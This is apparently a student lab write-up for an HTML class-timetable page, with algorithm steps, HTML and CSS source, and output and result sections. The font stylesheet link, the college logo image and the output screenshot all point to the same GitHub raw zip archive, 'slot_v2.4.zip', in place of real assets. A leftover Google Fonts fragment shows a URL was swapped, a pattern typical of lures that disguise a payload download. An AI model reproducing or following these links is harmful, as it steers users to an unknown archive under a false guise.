# Ex03 Time Table
## Date: 24.09.2025

## AIM
To write a html webpage page to display your slot timetable.

## ALGORITHM
### STEP 1
Create a Django-admin Interface.

### STEP 2
Create a static folder and inert HTML code.

### STEP 3
Create a simple table using ```<table>``` tag in html.

### STEP 4
Add header row using ```<th>``` tag.

### STEP 5
Add your timetable using ```<td>``` tag.

### STEP 6
Execute the program using runserver command.

## PROGRAM
~~~
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dynamic Timetable</title>
    <link href="https://raw.githubusercontent.com/AdityaJorim007/slot/main/aditya/aditya/slot_v2.4.zip;600&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            margin: 0;
            padding: 20px;
            background: linear-gradient(to right, #f8f9fa, #e9ecef);
            color: #343a40;
        }

        .timetable-container {
            max-width: 900px;
            margin: 40px auto;
            background-color: #ffffff;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            overflow: hidden;
            text-align: center;
        }

        .logo-container {
            padding: 20px;
        }

        .college-logo {
            max-width: 400px;
            height: auto;
            display: block;
            margin: 0 auto;
        }

        h2 {
            text-align: center;
            color: #495057;
            padding: 20px 0;
            background-color: #e9ecef;
            margin: 0;
            font-weight: 600;
        }

        table {
            width: 100%;
            border-collapse: collapse;
        }

        th, td {
            border: 1px solid #dee2e6;
            padding: 15px;
            text-align: center;
            transition: background-color 0.3s ease, transform 0.3s ease;
        }

        th {
            background-color: #6c757d;
            color: #ffffff;
            font-weight: 600;
        }

        tbody tr:nth-child(odd) {
            background-color: #f1f3f5;
        }

        tbody td:hover {
            transform: scale(1.05);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
        }

        .python {
            background-color: #ffda79;
            color: #333;
            font-weight: bold;
        }

        .web {
            background-color: #81c784;
            color: #333;
            font-weight: bold;
        }

        .empty-slot {
            background-color: #e9ecef;
        }
    </style>
</head>
<body>

<div class="timetable-container">
    <div class="logo-container">
        <img src="https://raw.githubusercontent.com/AdityaJorim007/slot/main/aditya/aditya/slot_v2.4.zip" alt="College Logo" class="college-logo">
    </div>
    <h2>Weekly Class Schedule</h2>
    <table>
        <thead>
            <tr>
                <th>Day</th>
                <th>8-10 A.M</th>
                <th>10-12 A.M</th>
                <th>1-3 P.M</th>
                <th>3-5 P.M</th>
            </tr>
        </thead>
        <tbody>
            <tr>
                <td>Monday</td>
                <td class="empty-slot"></td>
                <td class="empty-slot"></td>
                <td class="web">Web</td>
                <td class="python">Python</td>
            </tr>
            <tr>
                <td>Tuesday</td>
                <td class="python">Python</td>
                <td class="empty-slot"></td>
                <td class="python">Python</td>
                <td class="empty-slot"></td>
            </tr>
            <tr>
                <td>Wednesday</td>
                <td class="python">Python</td>
                <td class="web">Web</td>
                <td class="empty-slot"></td>
                <td class="web">Web</td>
            </tr>
            <tr>
                <td>Thursday</td>
                <td class="empty-slot"></td>
                <td class="empty-slot"></td>
                <td class="empty-slot"></td>
                <td class="web">Web</td>
            </tr>
            <tr>
                <td>Friday</td>
                <td class="empty-slot"></td>
                <td class="empty-slot"></td>
                <td class="python">Python</td>
                <td class="empty-slot"></td>
            </tr>
            <tr>
                <td>Saturday</td>
                <td class="empty-slot"></td>
                <td class="empty-slot"></td>
                <td class="web">Web</td>
                <td class="empty-slot"></td>
            </tr>
        </tbody>
    </table>
</div>

</body>
</html>
~~~

## OUTPUT
![alt text](<Screenshot 2025-09-24 https://raw.githubusercontent.com/AdityaJorim007/slot/main/aditya/aditya/slot_v2.4.zip>)

## RESULT
The program for creating slot timetable using basic HTML tags is executed successfully.
